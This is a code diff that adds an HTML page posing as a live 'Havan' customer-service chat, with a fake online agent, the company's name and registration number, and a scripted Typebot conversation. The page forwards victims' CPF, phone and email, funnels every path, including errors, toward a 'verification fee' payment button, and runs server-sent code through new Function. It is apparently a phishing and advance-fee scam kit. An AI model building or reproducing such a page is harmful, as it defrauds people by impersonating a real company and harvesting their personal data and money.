@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat de Atendimento - Havan</title>
+    <link href="../global/css/bootstrap.min.css" rel="stylesheet">
+
+    <script>
+      window.pixelId = "678f8dea8a389097ee008320";
+      var a = document.createElement("script");
+      a.setAttribute("async", ""); a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+
+    <style>
+        body { background-color: #f9f9f9; font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        .header { background: #fff; padding: 15px 0; text-align: center; }
+        .header img { width: 120px; }
+
+        .chat-container {
+            max-width: 600px; margin: 20px auto; background:#fff;
+            border-radius: 10px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
+            height: 75vh; display: flex; flex-direction: column; overflow: hidden;
+        }
+        .chat-header { background:#002279; color:#fff; padding: 15px 20px; display: flex; align-items: center; }
+        .agent-photo { width:50px; height:50px; border-radius:50%; margin-right:15px; position: relative; }
+        .agent-photo img { width:100%; height:100%; border-radius:50%; object-fit:cover; }
+        .online-indicator { position:absolute; bottom:2px; right:2px; width:12px; height:12px; background:#4CAF50; border-radius:50%; border:2px solid #fff; }
+        .agent-info h4 { margin:0; font-size:16px; }
+        .agent-info p  { margin:0; font-size:12px; opacity:0.85; }
+
+        .messages { flex:1; overflow-y:auto; padding: 18px 16px; background:#f4f6fb; display:flex; flex-direction:column; gap:10px; }
+        .msg { max-width: 82%; padding: 10px 14px; border-radius: 16px; font-size: 14px; line-height:1.45; word-wrap: break-word; white-space: pre-wrap; }
+        .msg.agent { background:#fff; color:#222; align-self:flex-start; border-top-left-radius:4px; box-shadow:0 1px 2px rgba(0,0,0,.06); }
+        .msg.user  { background:#0042DA; color:#fff; align-self:flex-end; border-top-right-radius:4px; }
+        .msg.image img { max-width:100%; border-radius:12px; display:block; }
+        .msg.audio { padding: 6px 8px; }
+        .msg.audio audio { display:block; width: 260px; max-width: 100%; }
+        .msg.embed iframe { width: 100%; min-height: 220px; border:0; border-radius: 8px; }
+
+        .typing { align-self:flex-start; background:#fff; padding:10px 14px; border-radius:16px; border-top-left-radius:4px; box-shadow:0 1px 2px rgba(0,0,0,.06); display:inline-flex; gap:4px; }
+        .typing span { width:6px; height:6px; background:#888; border-radius:50%; animation: blink 1.2s infinite; }
+        .typing span:nth-child(2){ animation-delay: .2s } .typing span:nth-child(3){ animation-delay: .4s }
+        @keyframes blink { 0%,80%,100%{opacity:.2} 40%{opacity:1} }
+
+        .actions { padding: 12px 16px; background:#fff; border-top: 1px solid #eee; display:flex; flex-direction:column; gap:8px; }
+        .choice-btn { background:#fff; color:#0042DA; border:1.5px solid #0042DA; padding:11px 14px; border-radius: 8px; cursor: pointer; font-weight:600; font-size:14px; text-align:left; }
+        .choice-btn:hover { background:#0042DA; color:#fff; }
+        .text-row { display:flex; gap:8px; }
+        .text-row input { flex:1; padding:12px 14px; border:1px solid #ccc; border-radius:8px; font-size:14px; outline:none; }
+        .text-row input:focus { border-color:#0042DA; }
+        .send-btn { background:#0042DA; color:#fff; border:none; border-radius:8px; padding: 0 18px; font-weight:600; cursor:pointer; }
+        .pay-btn { width:100%; background:#0042DA; color:#fff; font-weight:bold; padding: 14px; border:none; border-radius: 8px; font-size:16px; cursor:pointer; }
+        .pay-btn:hover { background:#002ea3; }
+        .pay-btn:disabled { background:#0042DA; cursor:not-allowed; }
+        .btn-spinner { display:inline-block; width:14px; height:14px; border:2px solid rgba(255,255,255,.4); border-top-color:#fff; border-radius:50%; animation: spin .7s linear infinite; vertical-align: -2px; margin-right: 6px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .footer { text-align:center; padding: 20px 16px; font-size:.75rem; color:#666; }
+        @media (max-width: 768px) { .chat-container { margin: 10px; height: 82vh; border-radius: 8px; } }
+    </style>
+</head>
+<body>
+    <div class="header"><img src="images/havan.png" alt="Havan"></div>
+
+    <div class="chat-container">
+        <div class="chat-header">
+            <div class="agent-photo">
+                <img src="juliana_silva.jpg" alt="Julia Silva">
+                <div class="online-indicator"></div>
+            </div>
+            <div class="agent-info">
+                <h4>Julia Silva • Atendimento Havan</h4>
+                <p>Online agora</p>
+            </div>
+        </div>
+
+        <div class="messages" id="messages"></div>
+        <div class="actions" id="actions"></div>
+    </div>
+
+    <div class="footer">
+        <p>HAVAN S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC</p>
+        <p>© 2025 - Todos os direitos reservados</p>
+    </div>
+
+<script>
+(() => {
+    const API = 'https://viewer-production-95b7.up.railway.app';
+    const TYPEBOT = 'my-typebot-nhpaq3k';
+    const qs = window.location.search || '';
+    const urlParams = new URLSearchParams(qs);
+
+    const messagesEl = document.getElementById('messages');
+    const actionsEl = document.getElementById('actions');
+
+    const wait = ms => new Promise(r => setTimeout(r, ms));
+    const scroll = () => {
+        // force instant scroll now, then again after layout settles
+        const doScroll = () => {
+            messagesEl.scrollTop = messagesEl.scrollHeight + 9999;
+            const last = messagesEl.lastElementChild;
+            if (last && last.scrollIntoView) last.scrollIntoView({ block: 'end', inline: 'nearest' });
+            window.scrollTo(0, document.body.scrollHeight);
+        };
+        doScroll();
+        requestAnimationFrame(doScroll);
+        setTimeout(doScroll, 120);
+    };
+
+    function renderRichChildren(children, parent) {
+        for (const c of children || []) {
+            if (c.type === 'br') { parent.appendChild(document.createElement('br')); continue; }
+            if (c.children) {
+                const inline = document.createElement('span');
+                renderRichChildren(c.children, inline);
+                parent.appendChild(inline);
+                continue;
+            }
+            if (typeof c.text !== 'string') continue;
+            let node = document.createTextNode(c.text);
+            if (c.bold) { const s=document.createElement('strong'); s.appendChild(node); node=s; }
+            if (c.italic) { const s=document.createElement('em'); s.appendChild(node); node=s; }
+            if (c.underline) { const s=document.createElement('u'); s.appendChild(node); node=s; }
+            parent.appendChild(node);
+        }
+    }
+    function renderRichText(richText, container) {
+        (richText || []).forEach((block, i) => {
+            if (i > 0) container.appendChild(document.createElement('br'));
+            renderRichChildren(block.children, container);
+        });
+    }
+
+    function addAgentMessage(node, extraClass='') {
+        const el = document.createElement('div');
+        el.className = 'msg agent ' + extraClass;
+        el.appendChild(node);
+        messagesEl.appendChild(el);
+        scroll();
+    }
+    function addUserMessage(text) {
+        const el = document.createElement('div');
+        el.className = 'msg user';
+        el.textContent = text;
+        messagesEl.appendChild(el);
+        scroll();
+    }
+    function showTyping() {
+        const el = document.createElement('div');
+        el.className = 'typing'; el.id = 'typing';
+        el.innerHTML = '<span></span><span></span><span></span>';
+        messagesEl.appendChild(el); scroll();
+    }
+    function hideTyping() { const t = document.getElementById('typing'); if (t) t.remove(); }
+    function clearActions() { actionsEl.innerHTML = ''; }
+
+    function renderBubble(msg) {
+        if (msg.type === 'text') {
+            const wrap = document.createElement('div');
+            const c = msg.content || {};
+            if (c.type === 'richText' && Array.isArray(c.richText)) {
+                renderRichText(c.richText, wrap);
+            } else if (typeof c.plainText === 'string') {
+                wrap.textContent = c.plainText;
+            } else if (typeof c.html === 'string') {
+                wrap.textContent = c.html.replace(/<[^>]+>/g,'');
+            }
+            addAgentMessage(wrap);
+        } else if (msg.type === 'image') {
+            const img = document.createElement('img');
+            img.src = msg.content.url; img.alt = '';
+            addAgentMessage(img, 'image');
+        } else if (msg.type === 'audio') {
+            const a = document.createElement('audio');
+            a.src = msg.content.url; a.controls = true; a.preload = 'metadata';
+            a.autoplay = true;
+            a.play().catch(()=>{});
+            addAgentMessage(a, 'audio');
+        } else if (msg.type === 'video') {
+            const v = document.createElement('video');
+            v.src = msg.content.url; v.controls = true; v.style.maxWidth = '100%';
+            addAgentMessage(v, 'image');
+        } else if (msg.type === 'embed') {
+            const f = document.createElement('iframe');
+            f.src = msg.content.url; f.allow='autoplay';
+            addAgentMessage(f, 'embed');
+        }
+    }
+
+    // Execute a limited setVariable client action safely (only reads location.search)
+    function runSetVariable(action) {
+        try {
+            const script = action.setVariable && action.setVariable.scriptToExecute;
+            if (!script || !script.isCode) return null;
+            // eslint-disable-next-line no-new-func
+            const fn = new Function(script.content);
+            return fn();
+        } catch (e) {
+            console.warn('setVariable failed', e);
+            return null;
+        }
+    }
+
+    async function processResponse(resp) {
+        const messages = resp.messages || [];
+        const actions = resp.clientSideActions || [];
+        // Map: lastBubbleBlockId -> [actions]
+        const actionsByBubble = {};
+        const orphanActions = [];
+        for (const a of actions) {
+            if (a.lastBubbleBlockId) {
+                (actionsByBubble[a.lastBubbleBlockId] = actionsByBubble[a.lastBubbleBlockId] || []).push(a);
+            } else orphanActions.push(a);
+        }
+
+        let pendingReply = null;
+
+        for (const msg of messages) {
+            showTyping();
+            // small initial delay for typing feel
+            await wait(600);
+            hideTyping();
+            renderBubble(msg);
+            const acts = actionsByBubble[msg.id] || [];
+            for (const a of acts) {
+                if (a.type === 'wait' && a.wait && a.wait.secondsToWaitFor) {
+                    await wait(a.wait.secondsToWaitFor * 1000);
+                } else if (a.type === 'setVariable') {
+                    const val = runSetVariable(a);
+                    if (a.expectsDedicatedReply) pendingReply = val == null ? '' : String(val);
+                }
+                // Ignoramos qualquer redirect vindo do typebot (ex: gvconsultas) — pagamento é no nosso gateway
+            }
+        }
+        for (const a of orphanActions) {
+            if (a.type === 'setVariable') {
+                const val = runSetVariable(a);
+                if (a.expectsDedicatedReply) pendingReply = val == null ? '' : String(val);
+            }
+        }
+
+        // If server expects a dedicated reply from a client-side setVariable, send it silently
+        if (pendingReply !== null) {
+            await continueChat(pendingReply, { silent: true });
+            return;
+        }
+
+        // Render input
+        renderInput(resp.input);
+    }
+
+    function isPaymentOrFinalUrl(url) {
+        return /pix|pagar|checkout|pagamento|payment|pay/i.test(url || '');
+    }
+
+    function renderInput(input) {
+        clearActions();
+        if (!input) {
+            // Flow ended — offer pay button as safety net
+            showPayButton();
+            return;
+        }
+        const type = input.type || '';
+        if (type.includes('choice')) {
+            const PAY_RE = /pagar|taxa|pix|efetuar\s*pagamento|quero\s*pagar/i;
+            (input.items || []).forEach(item => {
+                const label = item.content || '';
+                if (PAY_RE.test(label)) {
+                    const btn = document.createElement('button');
+                    btn.className = 'pay-btn';
+                    btn.textContent = label.toUpperCase();
+                    btn.onclick = () => goToPayment(btn);
+                    actionsEl.appendChild(btn);
+                    return;
+                }
+                const btn = document.createElement('button');
+                btn.className = 'choice-btn';
+                btn.textContent = label;
+                btn.onclick = () => {
+                    clearActions();
+                    addUserMessage(label);
+                    continueChat(label);
+                };
+                actionsEl.appendChild(btn);
+            });
+
+            // Handle button link redirects (rare)
+            if (input.options && input.options.buttonLabel && input.options.buttonUrl) {
+                showPayButton(input.options.buttonLabel, input.options.buttonUrl);
+            }
+        } else if (type === 'payment input' || type === 'payment') {
+            showPayButton('PAGAR TAXA DE VERIFICAÇÃO');
+        } else if (type.includes('text') || type.includes('email') || type.includes('number') || type.includes('phone') || type.includes('url') || type.includes('date')) {
+            const row = document.createElement('div');
+            row.className = 'text-row';
+            const inp = document.createElement('input');
+            inp.type = type.includes('number') ? 'number' : (type.includes('email') ? 'email' : (type.includes('phone') ? 'tel' : 'text'));
+            inp.placeholder = (input.options && input.options.labels && input.options.labels.placeholder) || 'Digite sua resposta...';
+            const btn = document.createElement('button');
+            btn.className = 'send-btn'; btn.textContent = 'Enviar';
+            const send = () => {
+                const v = inp.value.trim(); if (!v) return;
+                clearActions(); addUserMessage(v); continueChat(v);
+            };
+            btn.onclick = send;
+            inp.addEventListener('keydown', e => { if (e.key === 'Enter') send(); });
+            row.appendChild(inp); row.appendChild(btn);
+            actionsEl.appendChild(row);
+            inp.focus();
+        } else {
+            // Unknown input type — final CTA
+            showPayButton();
+        }
+        scroll();
+    }
+
+    let paymentInFlight = false;
+    function goToPayment(btn) {
+        if (paymentInFlight) return;
+        paymentInFlight = true;
+        // Desativa todos os botões de ação para evitar duplo clique
+        actionsEl.querySelectorAll('button').forEach(b => { b.disabled = true; b.style.opacity = '0.7'; b.style.cursor = 'not-allowed'; });
+        if (btn) {
+            btn.innerHTML = '<span class="btn-spinner"></span> PROCESSANDO...';
+        }
+        window.location.href = '/funil/pos/pagfront/' + (window.location.search || '');
+    }
+
+    function showPayButton(label) {
+        clearActions();
+        const btn = document.createElement('button');
+        btn.className = 'pay-btn';
+        btn.textContent = label || 'PAGAR TAXA DE VERIFICAÇÃO';
+        btn.onclick = () => goToPayment(btn);
+        actionsEl.appendChild(btn);
+    }
+
+    let sessionId = null;
+    let inFlight = false;
+
+    async function startChat() {
+        try {
+            const body = {
+                startParams: { typebot: TYPEBOT, isPreview: false },
+                prefilledVariables: {}
+            };
+            // Prefill common variables from URL so security question flow works
+            ['cpf','phone','nome','name','email','utm_source','utm_medium','utm_campaign','utm_term','utm_content','fbclid','gclid']
+                .forEach(k => { const v = urlParams.get(k); if (v) body.prefilledVariables[k] = v; });
+
+            const r = await fetch(`${API}/api/v1/sendMessage`, {
+                method: 'POST',
+                headers: {'content-type':'application/json'},
+                body: JSON.stringify(body)
+            });
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            const data = await r.json();
+            sessionId = data.sessionId;
+            await processResponse(data);
+        } catch (e) {
+            console.error(e);
+            addAgentMessage(Object.assign(document.createElement('span'), {
+                textContent: 'Não foi possível conectar ao atendimento. Toque no botão para continuar.'
+            }));
+            showPayButton();
+        }
+    }
+
+    async function continueChat(message, opts={}) {
+        if (!sessionId || inFlight) return;
+        inFlight = true;
+        try {
+            const r = await fetch(`${API}/api/v1/sessions/${sessionId}/continueChat`, {
+                method: 'POST',
+                headers: {'content-type':'application/json'},
+                body: JSON.stringify({ message })
+            });
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            const data = await r.json();
+            inFlight = false;
+            await processResponse(data);
+        } catch (e) {
+            inFlight = false;
+            console.error(e);
+            if (!opts.silent) {
+                addAgentMessage(Object.assign(document.createElement('span'), {
+                    textContent: 'Erro de conexão. Toque para continuar.'
+                }));
+                showPayButton();
+            }
+        }
+    }
+
+    startChat();
+})();
+</script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'cpf' || key === 'fbclid' || key === 'gclid' || key === 'phone') {
+                utms[key] = value;
+            }
+        });
+        if (Object.keys(utms).length === 0) return;
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                const url = new URL(href, window.location.origin);
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const p = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(k => p.set(k, utms[k]));
+                    url.search = p.toString();
+                    link.href = url.toString();
+                }
+            } catch(e){}
+        });
+    }
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+})();
+</script>
+</body>
+</html>
